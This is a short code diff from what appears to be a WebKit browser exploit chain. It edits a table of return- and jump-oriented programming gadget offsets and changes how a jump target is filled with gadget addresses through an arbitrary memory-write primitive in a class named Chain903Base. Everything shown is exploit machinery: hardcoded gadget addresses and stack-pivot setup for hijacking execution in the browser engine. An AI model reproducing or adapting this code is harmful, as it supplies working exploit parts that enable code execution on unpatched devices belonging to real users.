@@ -135,11 +135,6 @@ const jop7 = 'pop rsp; ret';
 //     pop rbp
 const rop_epilogue = 'leave; ret';
 
-const push_rdx_jmp = `
-push rdx
-jmp qword ptr [rax]
-`;
-
 const webkit_gadget_offsets = new Map(Object.entries({
     'pop rax; ret' : 0x0000000000051a12,
     'pop rbx; ret' : 0x00000000000be5d0,
@@ -174,8 +169,6 @@ const webkit_gadget_offsets = new Map(Object.entries({
     'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc,
     'mov qword ptr [rdi], rax; ret' : 0x000000000000613b,
     'mov rdx, rcx; ret' : 0x000000000157fe71,
-
-    [push_rdx_jmp] : 0x00000000028bd332,
 
     [jop1] : 0x00000000004e62a4,//0x0000000000f2c778,
     [jop2] : 0x00000000021fce7e,
@@ -235,8 +228,8 @@ class Chain903Base extends ChainBase {
         this.flag = new Uint8Array(8);
         this.flag_addr = get_view_vector(this.flag);
         this.jmp_target = new Uint8Array(0x100);
-        rw.write64(this.jmp_target, 0x1c, this.get_gadget(push_rdx_jmp));
-        rw.write64(this.jmp_target, 0, this.get_gadget('pop rsp; ret'));
+        rw.write64(this.jmp_target, 0x1c, this.get_gadget(jop6));
+        rw.write64(this.jmp_target, 0, this.get_gadget(jop7));
 
         // for save/restore
         this.is_saved = false;
